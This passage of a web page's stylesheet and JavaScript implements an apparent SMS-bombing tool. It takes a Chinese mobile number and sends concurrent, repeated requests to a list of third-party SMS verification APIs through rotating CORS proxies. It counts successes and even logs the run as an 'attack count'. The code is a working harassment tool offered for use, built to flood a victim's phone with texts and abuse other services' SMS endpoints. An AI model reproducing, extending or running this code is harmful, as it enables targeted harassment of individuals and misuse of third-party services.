        }

        input[type="text"],

            font-size: 20px;

            font-weight: 600;

            background-color: #FFFFFF;

        }

        .log-info {
            color: #FF9500;
        }

            color: #007AFF;
        }

        .log-time {
            color: #86868B;

            border-radius: 10px;
        }

            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
        }

        .log::-webkit-scrollbar-thumb:hover {
            background: rgba(0, 0, 0, 0.3);
        }

            color: #86868B;
            font-size: 13px;
            margin-top: 16px;

            overflow: hidden;
        }

            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;

            border-radius: 50%;

            height: 200px;

        // CORS代理配置（彻底解决版）
        //const USE_CORS_PROXY = true; // 设置为true启用CORS代理
        const USE_CORS_PROXY = false;
        
        // 多个代理备选列表（自动切换）
        // ⭐ 优先使用当前站点的本地代理，其次是自定义域名代理
        const CORS_PROXIES = [
            '/',                                                        // ✅ 本地 Page Functions 代理（首选）
            'https://cf.zk99999.dpdns.org/',                            // ✅ 新增 CF 路由代理（备用）
        ];
        
        let currentProxyIndex = 0; // 当前使用的代理索引
        
        // 代理请求辅助函数（智能切换）
        function proxyUrl(url, proxyIndex = currentProxyIndex) {
            if (USE_CORS_PROXY && proxyIndex < CORS_PROXIES.length) {
                const proxy = CORS_PROXIES[proxyIndex];
                // 如果是本站代理（以/开头），需要补全协议和域名以免某些 fetch 失败（尽管相对路径通常可行）
                const finalProxy = proxy.startsWith('/') ? window.location.origin + proxy : proxy;
                
                // 优化：改用查询参数方式，避免某些 CDN 对路径中包含 http:// 的请求报 404
                const separator = finalProxy.includes('?') ? '&' : '?';
                return finalProxy + separator + 'url=' + encodeURIComponent(url);
            }
            return url; // 直连
        }
        
        // ⭐ 增强的fetch函数（自动重试不同代理 + 请求去重）
        async function fetchWithProxyRetry(url, options = {}) {
            // 生成请求缓存键（URL + 方法）
            const cacheKey = `${options.method || 'GET'}:${url}`;
            const now = Date.now();
            
            // 检查缓存（如果5秒内请求过相同URL，直接返回缓存）
            if (requestCache.has(cacheKey)) {
                const cached = requestCache.get(cacheKey);
                if (now - cached.timestamp < CACHE_DURATION) {
                    // 返回缓存的响应克隆
                    return cached.response.clone();
                } else {
                    // 缓存过期，删除
                    requestCache.delete(cacheKey);
                }
            }
            
            let lastError = null;
            
            // 尝试所有代理
            for (let i = 0; i < CORS_PROXIES.length; i++) {
                try {
                    const proxiedUrl = proxyUrl(url, i);
                    const response = await fetch(proxiedUrl, {
                        ...options,
                        mode: 'cors',
                        credentials: 'omit' // 跨域时不发送凭证
                    });
                    
                    // 如果成功，返回响应
                    if (response.ok || response.status < 500) {
                        // 缓存成功的响应（只缓存成功的请求）
                        if (response.ok) {
                            requestCache.set(cacheKey, {
                                response: response.clone(),
                                timestamp: now
                            });
                            
                            // 定期清理过期缓存（避免内存泄漏）
                            if (requestCache.size > 500) {
                                const entriesToDelete = [];
                                requestCache.forEach((value, key) => {
                                    if (now - value.timestamp > CACHE_DURATION) {
                                        entriesToDelete.push(key);
                                    }
                                });
                                entriesToDelete.forEach(key => requestCache.delete(key));
                            }
                        }
                        return response;
                    }
                } catch (error) {
                    lastError = error;
                    console.log(`代理${i + 1}失败，尝试下一个...`, error.message);
                    continue; // 尝试下一个代理
                }
            }
            
            // 所有代理都失败，抛出错误
            throw lastError || new Error('所有代理都失败');
        }

       // 全局停止控制标志
        let isRunning = false;
        
        // 全局统计计数器
        let globalSuccessCount = 0;
        let globalFailureCount = 0;
        
        // ⭐ 连续失败计数器（用于自动停止）
        let consecutiveFailures = 0;
        const MAX_CONSECUTIVE_FAILURES = 20; // 连续失败20次后自动停止
        
        // 并发控制配置（防止请求堵塞）
        const MAX_CONCURRENT = 30; // 最大并发数（已优化：10→30）⚡
        const REQUEST_DELAY = 10; // 每批请求间隔(ms)（已优化：100ms→10ms）⚡
        
        // ⭐ 请求去重缓存（避免短时间内重复请求相同URL）
        const requestCache = new Map();
        const CACHE_DURATION = 5000; // 缓存时长5秒
        
        // ⭐ 防抖控制（避免用户重复点击）
        let lastClickTime = 0;
        const CLICK_DEBOUNCE = 2000; // 2秒防抖
        
        // 延迟函数
        function sleep(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }
        
        // 并发控制函数
        async function runWithConcurrency(tasks, maxConcurrent) {
            const results = [];
            const executing = [];
            
            for (const task of tasks) {
                const promise = task().then(result => {
                    executing.splice(executing.indexOf(promise), 1);
                    return result;
                });
                
                results.push(promise);
                executing.push(promise);
                
                if (executing.length >= maxConcurrent) {
                    await Promise.race(executing);
                }
            }
            
            return Promise.all(results);
        }

        function addLog(message, type = 'info') {
            const logArea = document.getElementById('smsLogArea');
            if (!logArea) {
                return;
            }
            
            const timestamp = new Date().toLocaleTimeString();
            const typeClass = `log-${type}`;
            
            // 根据类型添加不同SVG图标
            let iconClass = 'icon-info';
            let iconSvg = '';
            switch(type) {
                case 'success':
                    iconClass = 'icon-success';
                    break;
                case 'error':
                    iconClass = 'icon-error';
                    break;
                case 'info':
                    iconClass = 'icon-info';
                    break;
                case 'system':
                    iconClass = 'icon-system';
                    break;
            }
            iconSvg = `<svg class="icon icon-sm ${iconClass}"><use href="#${iconClass.replace('icon-', 'icon-')}"/></svg>`;
            
            logArea.innerHTML += `<span class="log-time">[${timestamp}]</span> <span class="${typeClass}">${iconSvg} ${message}</span><br>`;
            logArea.scrollTop = logArea.scrollHeight;
            
            const lines = logArea.innerHTML.split('<br>');
            if (lines.length > 1000) {
                logArea.innerHTML = lines.slice(-200).join('<br>');
            }
        }
        
        // 停止发送函数
        function stopRequests() {
            isRunning = false;
            document.getElementById('sendBtn').style.display = 'inline-block';
            document.getElementById('stopBtn').style.display = 'none';
            addLog('已停止发送', 'error');
            console.log('⏹️ 用户主动停止');
        }
        
        // 页面加载完成后自动聚焦到输入框
        window.addEventListener('load', function() {
            document.getElementById('phoneNumber').focus();
        });

       async function sendRequests() {
    // ⭐ 防抖检查（避免用户快速重复点击）
    const now = Date.now();
    if (now - lastClickTime < CLICK_DEBOUNCE) {
        addLog(`请勿频繁点击，请等待 ${Math.ceil((CLICK_DEBOUNCE - (now - lastClickTime)) / 1000)} 秒`, 'error');
        return;
    }
    lastClickTime = now;
    
    const phoneNumber = document.getElementById('phoneNumber').value.trim();
    const times = 1;

    if (!phoneNumber || !/^[1][3-9][0-9]{9}$/.test(phoneNumber)) {
    addLog('错误：请输入正确的11位中国手机号！', 'error');
    return;
    }
    
    // 清空之前的请求缓存（新的发送任务开始时）
    requestCache.clear();
    
    // 设置运行标志
    isRunning = true;
    
    // 重置全局计数器
    globalSuccessCount = 0;
    globalFailureCount = 0;
    consecutiveFailures = 0; // 重置连续失败计数器

    let successCount = 0;
    let failureCount = 0;
    let totalRequests = 0;
    let completedRequests = 0;
    
    // 状态统计
    const statusStats = {};
    
    console.log('🚀 开始发送请求...');
    console.log(`📱 手机号: ${phoneNumber}`);
    console.log(`🔢 攻击次数: ${times}`);
    console.log(`⚙️  并发控制: 最大${MAX_CONCURRENT}个并发`);
    console.log('─'.repeat(60));
    
    // 按钮状态切换（绿色开始 → 红色停止）
    document.getElementById('sendBtn').style.display = 'none';
    document.getElementById('stopBtn').style.display = 'inline-block';
    
    addLog(`开始向 ${phoneNumber} 发送短信...`, 'system');

    const requestTasks = [];
    
    // ⚡ 循环次数配置（提高成功率和发送频率）
    const REPEAT_COUNT = 3; // 每个接口执行3次

    for (let i = 0; i < times; i++) {
        // ⚡ 让每个接口循环执行多次
        for (let repeat = 0; repeat < REPEAT_COUNT; repeat++) {
            apiRequests.forEach((apiRequest) => {
                const requestData = apiRequest.data(phoneNumber, i + 1);
                totalRequests++;

                // 创建请求任务（带监控）
                const createRequestTask = () => async () => {
                // 检查是否已停止
                if (!isRunning) {
                    return;
                }
                
                const startTime = Date.now();
                let status = 'unknown';
                
                try {
                    let response;
                    
                    // 获取实际 URL（支持动态 URL）
                    const actualUrl = typeof apiRequest.url === 'function' 
                        ? apiRequest.url(phoneNumber, i + 1) 
                        : apiRequest.url;

            if (apiRequest.method && apiRequest.method === 'GET') {
                        response = await fetchWithProxyRetry(actualUrl, {
                    method: 'GET',
                    headers: apiRequest.headers()
                });
            } else if (apiRequest.method && apiRequest.method === 'POST_JSON') {
                        response = await fetchWithProxyRetry(actualUrl, {
                    method: 'POST',
                    headers: {
                                'Content-Type': 'application/json',
                                ...apiRequest.headers()
                    },
                    body: JSON.stringify(requestData)
                });
            } else if (apiRequest.method && apiRequest.method === 'POST_FORM') {
                const formData = new URLSearchParams();
                for (const key in requestData) {
                    if (requestData.hasOwnProperty(key)) {
                        formData.append(key, requestData[key]);
                    }
                }
                        response = await fetchWithProxyRetry(actualUrl, {
                    method: 'POST',
                    headers: {
                                'Content-Type': 'application/x-www-form-urlencoded',
                                ...apiRequest.headers()
                    },
                    body: formData.toString()
                });
            } else {
                        response = await fetchWithProxyRetry(actualUrl, {
                    method: 'POST',
                    headers: {
                                'Content-Type': 'application/json',
                                ...apiRequest.headers()
                    },
                    body: JSON.stringify(requestData)
                        });
                    }
                    
                    status = response.status;
                    completedRequests++;
                    
                    // 统计状态码
                    statusStats[status] = (statusStats[status] || 0) + 1;
                    
                    const duration = Date.now() - startTime;
                    
                    // ⭐ 验证响应是否真正成功
                    const contentType = response.headers.get('content-type') || '';
                    const isHtmlResponse = contentType.includes('text/html');
                    
                    // 判断失败原因
                    let failReason = '';
                    let isRealSuccess = response.ok;
                    
                    // 只有 200 返回 HTML 才检测是否是代理问题
                    if (response.ok && isHtmlResponse) {
                        try {
                            const text = await response.clone().text();
                            if (text.includes('Safety box') || (text.includes('<!DOCTYPE html>') && text.includes('服务器内部接口'))) {
                                isRealSuccess = false;
                                failReason = '代理异常';
                                console.warn(`⚠️ 代理返回了HTML页面而非API响应: ${actualUrl}`);
                            }
                        } catch (e) {}
                    } else if (!response.ok) {
                        // 非200状态码，根据状态码判断原因
                        if (status === 404) {
                            failReason = '接口不存在';
                        } else if (status === 403) {
                            failReason = '接口拒绝';
                        } else if (status === 500 || status === 502 || status === 503) {
                            failReason = '服务器错误';
                        } else if (status === 429) {
                            failReason = '请求过快';
                        } else {
                            failReason = `状态码${status}`;
                        }
                    }
                    
                    if (isRealSuccess) {
                        successCount++;
                        globalSuccessCount++;
                        consecutiveFailures = 0;
                        console.log(`✅ [${status}] ${apiRequest.method || 'POST'} 成功 (${duration}ms): ${actualUrl}`);
                        addLog(`成功 #${globalSuccessCount} (${duration}ms)`, 'success');
                    } else {
                        failureCount++;
                        globalFailureCount++;
                        consecutiveFailures++;
                        console.warn(`⚠️  [${status}] ${apiRequest.method || 'POST'} 失败(${failReason}) (${duration}ms): ${actualUrl}`);
                        
                        // 显示部分失败日志（前5个 + 每20个显示一次）
                        if (globalFailureCount <= 5 || globalFailureCount % 20 === 0) {
                            addLog(`${failReason} (${duration}ms)`, 'error');
                        }
                        
                        // ⭐ 连续失败过多，自动停止
                        if (consecutiveFailures >= MAX_CONSECUTIVE_FAILURES && isRunning) {
                            isRunning = false;
                            addLog(`连续失败${consecutiveFailures}次，已自动停止`, 'error');
                            addLog(`可能是代理额度超限，请明天再试`, 'info');
                            console.error(`🛑 连续失败${consecutiveFailures}次，自动停止发送`);
                        }
                    }
                    
                    // 每10个成功请求显示一次进度
                    if (successCount > 0 && successCount % 10 === 0) {
                        console.log(`📊 进度: ${completedRequests}/${totalRequests} | 成功: ${successCount} | 失败: ${failureCount}`);
                        addLog(`已成功: ${successCount} 个`, 'success');
                    }
                    
                } catch (error) {
                    failureCount++;
                    globalFailureCount++;
                    completedRequests++;
                    const duration = Date.now() - startTime;
                    const displayUrl = typeof apiRequest.url === 'function' ? 'Dynamic URL' : apiRequest.url;
                    console.error(`❌ [ERROR] ${apiRequest.method || 'POST'} 异常 (${duration}ms): ${displayUrl}`, error.message);
                    // 不显示异常日志
                }
            };

            requestTasks.push(createRequestTask());
        });
        }
    }

    // 使用并发控制执行所有请求
    console.log(`\n📦 总共创建 ${totalRequests} 个请求任务`);
    console.log(`⚙️  使用 ${MAX_CONCURRENT} 个并发执行\n`);
    
    const startTime = Date.now();
    
    await runWithConcurrency(requestTasks, MAX_CONCURRENT);
    
    const totalTime = ((Date.now() - startTime) / 1000).toFixed(2);
    
    // 打印详细统计
    console.log('\n' + '═'.repeat(60));
    console.log('📊 执行完成 - 详细统计报告');
    console.log('═'.repeat(60));
    console.log(`⏱️  总耗时: ${totalTime}秒`);
    console.log(`📦 总请求: ${totalRequests}个`);
    console.log(`✅ 成功: ${successCount}个 (${(successCount/totalRequests*100).toFixed(1)}%)`);
    console.log(`❌ 失败: ${failureCount}个 (${(failureCount/totalRequests*100).toFixed(1)}%)`);
    console.log('\n📈 状态码分布:');
    
    // 按状态码排序并显示
    const sortedStats = Object.entries(statusStats).sort((a, b) => b[1] - a[1]);
    sortedStats.forEach(([code, count]) => {
        const percentage = (count / totalRequests * 100).toFixed(1);
        const emoji = code === '200' ? '✅' : code.startsWith('4') ? '⚠️' : '❌';
        console.log(`   ${emoji} ${code}: ${count}个 (${percentage}%)`);
    });
    
    console.log('═'.repeat(60) + '\n');
    
    // 添加完成日志（在修改 isRunning 之前）
    const wasRunning = isRunning;
    
    // 恢复按钮状态（红色停止 → 绿色开始）
    isRunning = false;
    document.getElementById('sendBtn').style.display = 'inline-block';
    document.getElementById('stopBtn').style.display = 'none';
    
    // 添加最终统计日志（显示完整统计）
    addLog('─'.repeat(30), 'system');
    if (wasRunning) {
        addLog(`发送完成！`, 'system');
    } else {
        addLog(`已停止发送`, 'system');
    }
    
    // 计算成功率
    const successRate = totalRequests > 0 ? ((successCount / totalRequests) * 100).toFixed(1) : 0;
    
    // 显示完整统计
    if (successCount > 0) {
        addLog(`成功: ${successCount} 个 (${successRate}%)`, 'success');
    }
    if (failureCount > 0) {
        addLog(`失败: ${failureCount} 个`, 'error');
    }
    addLog(`耗时: ${totalTime}秒`, 'info');
    
    // 如果大量失败，提示代理问题
    if (failureCount > successCount * 2) {
        addLog(`大量请求失败，请检查代理配置`, 'error');
    }
    addLog('─'.repeat(30), 'system');
}

    </script>
